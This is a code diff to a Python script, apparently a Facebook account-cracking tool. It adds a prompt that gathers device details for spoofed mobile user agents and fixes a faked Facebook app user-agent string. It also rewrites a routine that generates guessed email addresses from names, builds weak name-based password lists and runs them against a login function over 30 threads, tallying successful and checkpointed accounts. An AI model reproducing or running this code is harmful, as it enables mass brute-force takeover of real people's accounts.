@@ -6,17 +6,17 @@ import os
 try:
 	import requests
 except ImportError:
-	print('\n [] requests module not installed!...\n')
+	print('\n [×] requests module not installed!...\n')
 	os.system('pip install requests')
 try:
 	import concurrent.futures
 except ImportError:
-	print('\n [] Futures module not installed!...\n')
+	print('\n [×] Futures module not installed!...\n')
 	os.system('pip install futures')
 try:
 	import bs4
 except ImportError:
-	print('\n [] Bs4 module not installed!...\n')
+	print('\n [×] Bs4 module not installed!...\n')
 	os.system('pip install bs4')
 import os
 import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
@@ -304,6 +304,41 @@ def menu():
 			else:
 				exit(' Option not found in menu...')
 
+def useragent():
+                passlist = []
+                if not os.path.exists('device_info.txt'):
+                        os.system('clear')
+                        print(logo)
+                        print(" what is your andriod version ex 8,9,10")
+                        version_=input(' type andriod version : ')
+                        print(44*'=')
+                        print(" your mobile model name ex Techno LD7 etc")
+                        model_=input(" model Name : ")
+                        print(44*"=")
+                        print(" your mobile company name ex Techno,Redmi")
+                        brand_name_=input(" device company name : ")
+                        print(44*'=')
+                        print(" your mobile width ex 720,740,730,780 etc")
+                        width_=input(" device width : ")
+                        print(44*'=')
+                        print(" your mobile height ex 1660,1780,1730 etc")
+                        height_=input(" device height : ")
+                        print(44*'=')
+                        print(" your mobile height ex R16NW,LRX22C etc")
+                        build_=input(" build : ")
+                        print(44*'=')
+                        print(" your mobile height ex Jazz,Telenor,Zong etc")
+                        operator_=input(" Operator : ")
+                        print(44*'=')
+                        print(" your mobile height ex 2.5,3.0 etc")
+                        density_=input(" density : ")
+                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+build_+'$'+operator_+'$'+density_)
+                os.system('clear')
+                print(logo)
+                linex()
+                input(' Successfully created Press enter to back ')
+                os.system('python azeem.py')
+
 def m1(ids,passlist):
         global loop
         global oks
@@ -328,7 +363,7 @@ def m1(ids,passlist):
                         fbrv = '0'
                         fban = 'FB4A'
                         fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA'
+                        ua = 'Dalvik/2.1.0 (Android 9; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA'
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -603,78 +638,59 @@ def ffb(ids,names,passlist):
 		time.sleep(20)
 	loop+=1
 def gmail():
-        os.system('rm -rf .re.txt')
-        os.system('clear');print(logo);linex()
-        print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
-        linex()
-        first = input(' Put first name: ')
-        linex()
-        print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
-        linex()
-        last = input(' Put last name: ')
-        linex()
-        print(' Example: @gmail.com , @yahoo.com etc...')
-        linex()
-        domain = input(' domain: ')
-        linex()
-        try:
-                limit=int(input(' Put limit: '))
-        except ValueError:
-                limit = 5000
-        print(' Getting gmails...')
-        lists = ['3','4']
-        for xd in range(limit):
-                lchoice = random.choice(lists)
-                if '3' in lchoice:
-                        mail = ''.join(random.choice(string.digits) for _ in range(3))
-                        open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-                else:
-                        mail = ''.join(random.choice(string.digits) for _ in range(4))
-                        open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
-        fo = open('.re.txt', 'r').read().splitlines()
-        print(' Do you went show cp account? (y/n): ')
-        linex()
-        cx=input(' Choose: ')
-        if cx in ['y','Y','yes','Yes','1']:
-                pcp.append('y')
-        else:
-                pcp.append('n')
-        linex()
-        with tred(max_workers=30) as yaari:
-                tl = str(len(fo))
-print(' All method working try 1 by 1 ')
-linex()
-print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
-linex()
-zew = input(' Choose method: ')
-linex()
-os.system('clear');print(logo)
-print(' Total account : \033[1;32m'+tl)
-print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
-linex()
-for user in fo:
-                        ids,names = user.split('|')
-                        first_name = names.rsplit(' ')[0]
-                        try:
-                                last_name = names.rsplit(' ')[1]
-                        except IndexError:
-                                last_name = 'Khan'
-                        fs = first_name.lower()
-                        ls = last_name.lower()
-                        passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-if zee in ['1','01']:
-		yaari.submit(m1,ids,passlist)
-elif zee in ['2','02']:
-				yaari.submit(m2,ids,passlist)
-else:
-				yaari.submit(m1,ids,passlist)
-print('\033[1;37m')
-linex()
-print(' The process has completed')
-pint(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
-linex()
-input(' Press enter to back ')
-os.system('python azeem.py')
+                os.system('rm -rf .re.txt')
+                os.system('clear');print(logo);linex()
+                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+                linex()
+                first = input(' Put first name: ')
+                linex()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                linex()
+                last = input(' Put last name: ')
+                linex()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                linex()
+                domain = input(' domain: ')
+                linex()
+                try:
+                        limit=int(input(' Put limit: '))
+                except ValueError:
+                        limit = 5000
+                print(' Getting gmails...')
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        else:
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.re.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as yaari:
+                        tl = str(len(fo))
+                        os.system('clear');print(logo)
+                        print(' Total account : \033[1;32m'+tl)
+                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        linex()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                yaari.submit(m1,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' The process has completed')
+                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
+                linex()
+                input(' Press enter to back ')
+                os.system('python azeem.py')
 	
 def zee1():
 	os.system('clear')
